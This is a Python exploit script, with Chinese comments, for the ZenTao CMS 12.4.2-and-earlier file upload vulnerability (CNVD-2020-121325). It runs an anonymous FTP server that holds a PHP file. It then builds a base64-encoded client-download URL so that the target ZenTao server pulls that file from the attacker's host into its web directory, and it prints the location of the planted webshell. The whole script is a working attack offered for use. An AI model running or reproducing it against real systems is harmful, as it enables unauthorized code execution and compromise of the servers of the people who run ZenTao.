# pip install pyftpdlib
# 禅道 zentao_cnvd_2020_121325
# 禅道CMS<=12.4.2 文件上传漏洞
# 条件： 使用了2121, 2122, 2123端口, 请确保能用
from threading import Thread

filename = 'basic4.PHp'
my_ftp_server = f'ftp://192.168.50.161:2121/{filename}'.encode()
host = '192.168.127.129:49156'
web_host = f'http://{host}'
web_zentao = f'http://{host}/zentao'
client_download_url = f'{web_zentao}/client-download-1-%s-1.html'
shell = f'{web_zentao}/data/client/1/{filename}'

serve_path = "./"


def ftp():
    from pyftpdlib.authorizers import DummyAuthorizer
    from pyftpdlib.handlers import FTPHandler
    from pyftpdlib.servers import FTPServer
    authorizer = DummyAuthorizer()
    authorizer.add_anonymous(serve_path)
    handler = FTPHandler
    handler.authorizer = authorizer
    handler.passive_ports = range(2122, 2123)
    server = FTPServer(("0.0.0.0", 2121), handler)
    server.serve_forever()


def get_url():
    from base64 import b64encode
    surl = b64encode(my_ftp_server).decode()
    return client_download_url % surl


url = get_url()

if __name__ == '__main__':
    # ftp()

    print('1.开启服务器穿透到本机2121-2123')
    print('2.访问url')
    print(url)
    print('shell:', shell)

    t1_ftp = Thread(target=ftp, name="t1")
    t1_ftp.start()

    from exp_zentao_cnvd_2020_121325_package import exploit

    t2_ftp = Thread(target=exploit, name="t2")
    # t2_ftp = Thread(target=go, name="t2")
    t2_ftp.start()

    # res = requests.get(url)
    # print(res.text)
    # import webbrowser
    # webbrowser.open(url)
